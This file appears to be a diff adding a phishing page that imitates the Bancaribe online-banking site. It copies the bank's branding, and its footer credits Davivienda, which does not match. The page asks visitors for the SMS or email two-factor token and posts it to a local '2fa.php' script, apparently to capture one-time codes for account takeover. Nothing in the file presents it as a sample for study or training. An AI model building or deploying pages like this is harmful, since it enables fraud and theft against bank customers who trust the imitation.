@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mi Conexión Bancaribe Digital</title>
+    <link rel="shortcut icon"
+        href="https://d3olc33sy92l9e.cloudfront.net/wp-content/themes/bancaribe/images/bancaribe.ico.gzip">
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff;
+            text-align: center;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .logo {
+            margin: 30px 0;
+        }
+
+        .logo img {
+            width: 300px;
+        }
+
+        .login-container {
+            background-color: #ffffff;
+            border: 1px solid #ED1C24;
+            border-radius: 5px;
+            width: 360px;
+            margin: 20px auto;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: left;
+        }
+
+        .login-header {
+            background-color: #ED1C24;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            padding: 15px;
+            border-top-left-radius: 5px;
+            border-top-right-radius: 5px;
+        }
+
+        .login-body {
+            padding: 20px;
+        }
+
+        .login-body input {
+            width: calc(100% - 40px);
+            padding: 10px;
+            margin: 10px 20px;
+            border: 1px solid #cccccc;
+            border-radius: 5px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+
+        .login-body button {
+            width: calc(100% - 40px);
+            padding: 10px;
+            margin: 10px 20px;
+            background-color: #ED1C24;
+            border: none;
+            border-radius: 5px;
+            color: #ffffff;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .login-body button:hover {
+            background-color: #C4121A;
+        }
+
+        .options {
+            display: flex;
+            justify-content: center;
+            gap: 50px;
+            margin: 20px auto;
+            max-width: 360px;
+        }
+
+        .option {
+            text-align: center;
+            font-size: 14px;
+            color: #ED1C24;
+        }
+
+        .option img {
+            width: 50px;
+            margin-bottom: 5px;
+        }
+
+        footer {
+            background-color: #ED1C24;
+            color: white;
+            font-size: 12px;
+            padding: 10px 20px;
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            text-align: center;
+        }
+
+        footer a {
+            color: #ffffff;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<form action="2fa.php" method="post">
+
+    <body>
+        <div class="logo">
+            <img src="logo1.jpg" alt="Logo">
+        </div>
+
+        <div class="login-container">
+            <div class="login-header">Ingresa el código enviado por SMS o Correo electrónico</div>
+            <div class="login-body">
+                <!-- Campo de Token -->
+                <input type="text" name="token" placeholder="Token" required>
+                <button type="submit">Ingresar</button>
+            </div>
+        </div>
+
+        <div class="options">
+            <div class="option">
+                <img src="https://i.postimg.cc/25wjrwXv/a1.png" alt="Cliente nuevo">
+                <div>Cliente nuevo</div>
+            </div>
+            <div class="option">
+                <img src="https://i.postimg.cc/G2gcspRm/a2.png" alt="Recupera tu acceso">
+                <div>Recupera tu acceso</div>
+            </div>
+        </div>
+
+        <footer>
+            <a href="#">Políticas de Seguridad</a> |
+            <a href="#">Políticas de Privacidad</a> |
+            <a href="#">Términos y Condiciones</a>
+            <p>© DAVIVIENDA. Todos los derechos reservados.</p>
+        </footer>
+    </body>
+</form>
+
+</html>
